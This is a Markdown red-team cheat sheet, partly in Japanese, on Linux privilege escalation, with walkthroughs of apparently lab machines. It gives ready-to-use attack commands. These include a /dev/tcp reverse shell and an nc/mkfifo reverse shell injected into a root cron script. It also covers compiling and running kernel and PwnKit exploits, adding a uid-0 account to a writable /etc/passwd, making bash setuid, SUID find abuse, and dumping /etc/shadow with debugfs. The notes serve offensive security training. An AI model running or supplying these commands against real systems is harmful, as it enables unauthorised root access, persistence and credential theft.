---
title: Linux
parent: Red Team
nav_order: 7
has_children: true
---
# Linux Privilege Escalation

---

## Purpose

Gain privileges on a Linux system.

Main objectives:
- Gain the privileges of other users
- Gain root privileges
- Execute commands as root
- Access restricted files
- Gather information for deployment to other systems
- Maintain persistence

---

## Attack Flow

Initial foothold → Enumeration → Identify misconfig or Vulnerability → Exploit → Root

---

## Quick Wins

- sudo -l
- SUID binaries
- writable files
- cron jobs
- credentials in env / config files

---


<details markdown="1">
<summary>TTY Shell</summary>

# TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

```bash
import os; echo "os.system('/bin/bash')"
```

```bash
/bin/sh -i
```

```bash
bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
```
- >& 標準出力(stdout) と 標準エラー(stderr) を同じ場所へリダイレクト。つまり：bash の出力全部→ TCP接続先へ送る
- 0>&1   0 = stdin 1 = stdout   つまり：stdin を stdout と同じ先へ向ける結果：攻撃者 → stdin
標的bash → stdout/stderr → 攻撃者 双方向通信になる。

```bash
perl -e 'exec "/bin/sh";'
```

## Suspend

```zsh
rlwrap -cAr nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.248.117] 48652
python3 -c 'import pty;pty.spawn("/bin/bash")'
[cmeeks@hetemit restjson_hetemit]$ whoami
whoami
cmeeks
[cmeeks@hetemit restjson_hetemit]$ 
zsh: suspended  rlwrap -cAr nc -lvnp 18000
```

## Restart

```zsh
stty raw -echo;fg
[1]  + continued  rlwrap -cAr nc -lvnp 18000
[cmeeks@hetemit restjson_hetemit]$ 
```

</details>

---

# System Enumeration
### basic info
```bash
whoami
```

```bash
id
```

```bash
hostname
```

```bash
uname -ar
```

### OS / version
```bash
cat /etc/os-release
```

## Kernel Exploits

```zsh
uname -ar
```

👉 Check:

- exploit-db / searchsploit


<details markdown="1">
<summary>ubuntu_16.04.04</summary>

### カーネルの脆弱性を悪用する
 
 #### ターゲットマシンの情報収集
```bash
cat /etc/issue
Ubuntu 16.04.4 LTS \n \l
```

```bash
#カーネルのバージョンとシステム アーキテクチャを検査
uname -r 
4.4.0-116-generic

arch
x86_64
```

#### 関連するexploitの調査
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation   | linux/local/45010.c

cp /usr/share/exploitdb/exploits/linux/local/45010.c .

head 45010.c -n 20
gcc cve-2017-16995.c -o cve-2017-16995

mv 45010.c cve-2017-16995.c

#転送
scp cve-2017-16995.c joe@192.168.123.216:
```

#### ターゲット上でコンパイル
```bash
gcc cve-2017-16995.c -o cve-2017-16995

file cve-2017-16995

./cve-2017-16995

id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
```

</details>

### users
```bash
cat /etc/passwd
```

```zsh
id
```

```zsh
ls /home
```

## Sudo Privileges
```bash
sudo -l
```

👉 Check:

NOPASSWD entries
allowed binaries

👉 Example:

```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
```

👉 Example:
-  (root) /usr/bin/ftp

👉 Exploit:

[GTFOBins](https://gtfobins.github.io/) reference

---

## SUID Binaries

```zsh
find / -perm -4000 -type f 2>/dev/null
```

👉 Check:

unusual binaries
custom scripts

👉 Exploit:

[GTFOBins](https://gtfobins.github.io/) reference

---
## Capabilities

```bash
getcap -r / 2>/dev/null
```

👉 Check:

binaries with elevated capabilities


If Python

![](../../assets/images/Pasted%20image%2020260520055618.png)

![](../../assets/images/Pasted%20image%2020260520055728.png)

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

---

## Writable Files

```zsh
find / -writable -type f 2>/dev/null
```

👉 Check:

config files
scripts executed by root

---

# Cron Jobs

```zsh
cat /etc/crontab
```

```zsh
ls -la /etc/cron*
```

👉 Check:
# cron
```bash
ls -lah /etc/cron*

# 現在のユーザ
crontab -l

# sudo
sudo crontab -l
# sudoをつけたときとの違いを確認する
```

---

# Process

<details markdown="1">
<summary>Process</summary>
## Process
```bash
ps aux
```
- a: 自分以外のユーザーのプロセスもすべて表示
- u: ユーザー名やCPU/メモリ使用率などの詳細を表示
- x: 制御端末（TTY）を持たないプロセスも表示 

```zsh
pa -eaf
```
-e: すべてのプロセスを表示。
-a: 他のユーザーのプロセスも含めて表示（通常-eと併用）。
-f: フルフォーマット（詳細）で表示。

# pspy
## github
```
https://github.com/DominicBreuker/pspy
```

```zsh
./pspy64
```
## passphraseが取得可能な例
![651](../../../../../assets/images/Pasted%20image%2020260430181307.png)

# サービスフットプリントの検査
### 実行中のプロセスの動作を検査
```bash
#watchユーティリティを使ってpsコマンドを1秒ごとに実行し、 「pass」という単語が出現するたびに結果をgrep検索
watch -n 1 "ps -aux | grep pass"
```
---
# インストールされたアプリケーションを一覧表示
```bash
dpkg -l
```
---
# Karnel_&_Module
ターゲットにロードされているドライバとカーネルモジュールのリストを収集

```bash
lsmod

# list内のモジュールについての詳細調査
/sbin/modinfo libata
```

</details>

<details markdown="1">
<summary>writable scripts</summary>

## 安全でないファイル権限のCronジョブの悪用

### ジョブの確認
```bash
grep "CRON" /var/log/syslog
Jul  7 09:15:15 debian-privesc CRON[1315]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

```bash
cat /home/joe/.scripts/user_backups.sh
```

user_backups.shの内容
```bash
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/
```

権限の確認
```bash
ls -lah /home/joe/.scripts/user_backups.sh
```

### スクリプトの改ざん
```bash
cd .scripts
```

```zsh
echo >> user_backups.sh
```

```zsh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.176 1234 >/tmp/f" >> user_backups.sh
```

`Kali`
```bash
nc -nlvp 1234

id
```

</details>

---

# PATH Hijacking

```zsh
echo $PATH
```

👉 Check:

writable directories in PATH

---

## Credentials Hunting

```zsh
grep -r "password" /home 2>/dev/null
```

```zsh
grep -r "pass" /etc 2>/dev/null
```

```bash
grep -rinE '(password|pword|username|user|pass|key|token|secret|admin|login|credentials|cred)'
```

👉 Common locations:

- config files
- scripts
- history files

---
# Disk

# File_&_Disk


## 起動時にマウントされるドライブの一覧
```bash
cat /etc/fstab
```

## マウントされているすべてのファイルシステム
```bash
mount
```

## すべての利用可能なドライブの一覧
```bash
lsblk
```

## Disk権限
![](../../../../../assets/images/Pasted%20image%2020260430184908.png)

```bash
df -h
```

```
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  56% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
```

## Read_File
```bash
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
```

---
# Network
# Interface
```bash
ip a

ifconfig
```

# Routing
```bash
route

routel
```

# Active NW
```bash
ss -anp

netstat
```

### サーバの待受けサービスの調査
```bash
netstat -ltunp
```

# ネットワーク トラフィックをキャプチャする権限があるかどうかを確認
```bash
#ループバックインターフェースに出入りするトラフィックをキャプチャ
#-Aパラメータを使用してその内容をASCII形式でダンプ
sudo tcpdump -i lo -A | grep "pass"
```
# FW
```bash
cat /etc/iptables/rules.v4
```
---

# EnumTools


<details markdown="1">
<summary>linpeas</summary>

## linpeas

```bash
wget http://<IP>/linpeas.sh
```

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

- Common Issues
- Missing execution permissions
- Wrong PATH usage
- Misinterpreting SUID results

👉 Check: 
## Capabilities

</details>


<details markdown="1">
<summary>linux-smart-enumeration</summary>

## linux-smart-enumeration

### github


https://github.com/diego-treitos/linux-smart-enumeration

```zsh
python3 -m http.server 80
```

![](../../assets/images/Pasted%20image%2020260513224137.png)

```bash
chmod +x lse.sh 
```

- Enum for Level1
```zsh
./lse.sh -l1
```

</details>


<details markdown="1">
<summary>unix-privesc-check</summary>

## unix-privesc-check

`Kali`
```bash
cp /usr/bin/unix-privesc-check .
```

```zsh
python3 -m http.server 80
```

`Victim`
```bash
wget http://192.168.45.176/unix-privesc-check
```

```zsh
chmod 777 unix-privesc-check
```

the script supports "standard" and "detailed" mode.

```zsh
./unix-privesc-check standard > output.txt
```

```zsh
cat output.txt  | grep WARNING
```

Search the output below for the word 'WARNING'.  If you don't see it then WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd

</details>


<details markdown="1">
<summary>Metasploit Module</summary>

## Metasploit Module

multi/recon/local_exploit_suggester
Metasploitフレームワーク内の`multi/recon/local_exploit_suggester`モジュールは、ターゲットシステムでの特権昇格に利用できるローカルエクスプロイトを提案します。このモジュールは、ターゲットシステム上の既知の脆弱性を分析し、適切なエクスプロイトを推奨します。

</details>

---

## Example Vulnerabilities

### [Copy Fail](../99_attack_repo/101-150_lin-vuln/102_lin_copy-fail.md)

```zsh
python3 github/Tools/PrivEsc/Linux/copy-fail-CVE-2026-31431/copy_fail_exp.py
```

### [Dirty Flag](https://github.com/V4bel/dirtyfrag)


### [CVE-2024-1086](../99_attack_repo/101-150_lin-vuln/101_lin_cve-2024-1086.md)


---
# Example
## VM2
[https://github.com/ly4k/PwnKit/blob/main/PwnKit](https://github.com/ly4k/PwnKit/blob/main/PwnKit)
古いバージョンのKarnelの認証(polkit)の脆弱性を利用する
```bash
#Victim
uname -r
4.4.0-116-generic

#Kali
scp PwnKit joe@192.168.180.216:

#Victim
chmod 777 PwnKit 

./PwnKit 

id
uid=0(root) gid=0(root) groups=0(root),1001(joe)

```
---
## VM3
```bash
ssh student@192.168.180.52 -p2222

ls -lah /etc/cron*

/etc/cron.hourly:
total 16K
drwxr-xr-x 1 root root 4.0K Dec  7  2021 .
drwxr-xr-x 1 root root 4.0K Jul 12 16:37 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rw-r--r-- 1 root root  139 Dec  7  2021 archiver

cat /etc/cron.hourly/archiver                        
#!/bin/sh
# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh

cat /var/archives/archive.sh                           
#!/bin/bash
TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/

echo "chmod u+s /bin/bash" >> /var/archives/archive.sh

ls -la /bin/bash                          
-rwsr-xr-x 1 root root 1254856 Oct 15  2020 /bin/bash

/bin/bash -p                                                                                             

bash-5.1# id
uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# ls
flag.txt
bash-5.1# cat flag.txt
```
---
## VM4
```bash
└─$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1370 Jul 13 13:44 /etc/passwd
┌──(student㉿6cfa0a805f4d)-[~]
└─$ openssl passwd w00t                                                     
DPwf7nemkGSlI
┌──(student㉿6cfa0a805f4d)-[~]
└─$ echo "root2:DPwf7nemkGSlI:0:0:root:/root:/bin/bash" >> /etc/passwd      
┌──(student㉿6cfa0a805f4d)-[~]
└─$ su root2
Password: 
┌──(root💀6cfa0a805f4d)-[/home/student]
└─# cat /root/flag.txt 
OS{}
```
---
## VM5
```bash
student@3afd11bd5457:~$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/find

student@3afd11bd5457:~$ ./find . -exec /bin/sh -p \; -quit
-bash: ./find: No such file or directory
student@3afd11bd5457:~$ ls -la /usr/bin/find 
-rwsr-xr-x 1 root root 238080 Nov  5  2017 /usr/bin/find
student@3afd11bd5457:~$ find /home/student -exec "/bin/bash" -p \;
bash-4.4# id
uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt
Great job! You found me.
Here is your flag:

```
